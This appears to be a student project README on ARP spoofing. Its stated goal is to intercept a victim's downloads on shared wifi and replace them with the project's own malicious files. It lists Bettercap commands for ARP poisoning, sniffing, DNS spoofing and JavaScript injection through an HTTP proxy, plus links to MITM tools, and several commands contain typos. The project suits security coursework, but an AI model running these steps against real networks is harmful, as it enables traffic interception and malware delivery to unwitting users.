# Internet and Network Security project

## ARP spoofing, also known as ARP poisoning

### Project idea

To use ARP poisoning to inject malice files when the user downloads a file.
Our setup will discover if someone downlaods a file, and instead our file is downloaded

### Goal

To have a docker container which has all the needed tools, programs, scripts, ... installed

#### Road map

- [ ] Manage ARP spoofing
- [ ] Listening to downloads and what files
- [ ] Replace downloaded file with our file

### What do do

1) Be in the same wifi
2) find out ip of target `nmap`
3) 


```
# Wireshark
ip.addr == 192.168.22.101
```

### Terminal

```
# show arp
arp -a

# delete arp
arp -d -a
```

### Bettercap

192.168.178.118

```
sudo bettercap -iface eth0


active

net.show

# Spoofing

net.prope on

set arp.spoof.targets <IP>

arp.spoof on

set net.sniff.output 

net.sniff on


```

### Setup DNS

https://crawler.ninja/files/http-sites.txt

```
set dns.sppof.domains <domain>
```

### Http proxy

```

set http.proxy.injectjs ./http-inject.js

http.proxy on

```

### Sources

#### Videos

* [how Hackers SNiFF (capture) network traffic // MiTM attack](https://youtu.be/-rSqbgI7oZM?si=xtfKk-oAmu4ksEZM)

#### Articles

### Tools

#### [Wireshakr](https://www.wireshark.org/)

Tool to listen/show network traffic

#### [nmap](https://nmap.org/)

Network discovery

#### [Ettercap](https://www.ettercap-project.org/)

To perform man in the middle attack

#### [Bettercap](https://www.bettercap.org/)

To perform man in the middle attack

##### Docker

```
docker pull bettercap/bettercap
docker run -it --privileged --net=host bettercap/bettercap -h
```

#### [mitmproxy](https://mitmproxy.org/)

#### [ARP Spoofing Tool](https://github.com/davidlares/arp-spoofing)

Script to perform man in the middle attack
